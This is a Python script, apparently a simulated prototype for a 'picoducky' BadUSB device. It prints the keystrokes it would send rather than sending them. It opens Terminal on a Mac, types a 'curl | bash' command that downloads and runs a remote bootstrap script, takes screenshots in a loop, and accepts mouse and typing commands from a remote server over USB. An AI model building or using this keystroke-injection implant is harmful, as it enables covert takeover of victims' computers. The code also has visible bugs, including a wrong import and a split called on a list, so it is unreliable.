import time
from types import Sequence

BOOTSTRAP_URL = (
    "https://raw.githubusercontent.com/jblitzar/picoducky/main/cc-src/bootstrap.sh"
)


def type_sequence(seq: Sequence[str]):
    print("seq is", "".join(seq))
    for item in seq:
        for key in item:
            if key == "⌘":
                print("Would press Command")
            elif key == "⇧":
                print("Would press Shift")
            elif key == "⌥":
                print("Would press Option")
            elif key == "⌃":
                print("Would press Control")
            elif key == "↩︎":
                print("Would press Enter")
        print(f"Would press: {item}")
        print("Would release all keys")
        time.sleep(0.05)  # insert arbitrary delay here


def move_mouse_to(x: int, y: int):
    print(f"Would move mouse to ({x}, {y})")
    time.sleep(0.1)


def screenshot():
    print("Would take a screenshot")
    type_sequence(["⌘3⇧"])
    time.sleep(0.1)


# imagine this was hooked up to a proper event listener
def on_recieve_usb_data(data: bytes):
    print(f"Received USB data: {data}")
    MAGIC_SEQUENCE = b"\x42\x67\x4a\x79"
    if not data.startswith(MAGIC_SEQUENCE):
        return
    data = data[len(MAGIC_SEQUENCE) :].decode("utf-8")
    print(f"Decoded data: {data}")
    data = data.split(";")
    command = data[0]
    if command == "mouse":
        coords = data[1].split(",")
        x, y = int(coords[0]), int(coords[1])
        move_mouse_to(x, y)
    elif command == "type":
        sequence = data[
            1:
        ].split(
            ",,"
        )  # to actually type that literal, it'd be ,,,,. So yes, every literal would be seperated like that. Hello World is H,,e,,l,,l,,o,, ,,,W,,o,,r,,l,,d
        # but for the most part server's just going to send single characters
        type_sequence(sequence)


def main():
    type_sequence(["⌘ ", "t", "e", "r", "m", "i", "n", "a", "l", "↩︎"])
    time.sleep(0.3)
    type_sequence(["↩︎"])
    command = f"curl -sSL {BOOTSTRAP_URL} | bash"
    type_sequence(list(command) + ["↩︎"])

    while True:
        time.sleep(1)
        screenshot()
